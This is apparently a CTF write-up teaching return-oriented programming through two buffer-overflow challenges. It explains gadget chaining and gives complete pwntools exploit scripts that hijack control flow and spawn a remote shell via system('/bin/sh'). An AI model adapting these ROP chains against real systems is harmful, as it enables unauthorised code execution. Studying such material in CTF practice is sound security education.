# ROP challenges

## FetusROP

This challenge aims to teach the basics of ROP. We have
a buffer overflow vuln, and we want to use it to call a `win` function with certain parameters.

If this challenge was given the 90s, then we can probably
just write shellcode and call it a day. (Full disclaimer: I do not know how to write shellcode.) But it is 2021, and NX is enabled; which means we can't execute code we pass in ourselves. The idea of ROP is to bypass this, by using code that already exists in the binary.

A legitimate, desirable call to `win` might look like this in assembly:

```asm
mov RDI, 0xcafe
mov RSI, 0x1337
JMP [address of win]
```
And our goal is to replicate this the best we can with existing code.

### ROP gadgets

ROP centers around finding _gadgets_, small snippets that help us accomplish our task. In our case:

- There is a `pop rdi; ret` at 0x4005f3. If the top value in the stack here is 0xcafe, this replicates the first instruction.
- There is a `pop rsi; pop r15, ret` at 0x4005f1. If the top value in the stack here is 0x1337, this replicates the second instruction.
- The third instruction can be replicated by ending our gadget chain with the address of `win`, more on this later.

### Putting it together

So, how do we kick off the chain of gadgets? Well, to fake a call to a function, you need to just put the address of the function at where the `rip` is on the stack. The new function's stack frame will go above this `rip`. So if we build a stack like this:
```
[address of pop rdi gadget]
[0xcafe]
[address of pop rsi; pop r15 gadget]
[0x1337]
[dummy value]
[address of win]
```

then we can fake 3 function calls, the first 2 being our gadgets, and the third being `win`. Which wins!

Here is exploit code:

```python
from pwn import *
io = remote("challs1.nusgreyhats.org", 5011)

# This is a hand-written ROP chain

padding = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn"

set_rdi = b"\xf3\x05\x40\x00\x00\x00\x00\x00\xfe\xca\x00\x00\x00\x00\x00\x00"

set_rsi_r15 = b"\xf1\x05\x40\x00\x00\x00\x00\x00\x37\x13\x00\x00\x00\x00\x00\x00qrstuvwx"

win = b"\x37\x05\x40\x00\x00\x00\x00\x00"

payload = padding + set_rdi + set_rsi_r15 + win + b"\n"

io.send(payload)

io.interactive()
```

## BabyROP

We use the same ideas. Except now, the function is `system`, and the argument is a pointer to a string containing `/bin/sh`.

> But spacewalker, didn't your team not solve this? Why is this here? Well, the approach actually mostly works; I just had the wrong pointer to the string.

Here is exploit code:
(I was working off a template a teammate gave me; hence the tooling is more sophisticated compared to fetusrop.)
```python
from pwn import *

io = remote("challs1.nusgreyhats.org", 5012)

LOCAL_BIN = "./babyrop"
LIBC = ELF("/home/space/ctf_real/nus_welcome2021/babyrop/libc.so.6")
ELF_LOADED = ELF(LOCAL_BIN) # Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

OFFSET = b"A"*40


POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]
SYSTEM_PLT =  ELF_LOADED.plt['system']
BIN_SH = 0x4006a4

log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))
log.info("system plt location: " + hex(SYSTEM_PLT))
log.info("bin sh string:" + hex(BIN_SH))


rop_chain = p64(POP_RDI) + p64(BIN_SH) + p64(RET) + p64(SYSTEM_PLT)

payload = OFFSET + rop_chain

io.sendline(payload)

io.interactive() # This is a shell
```
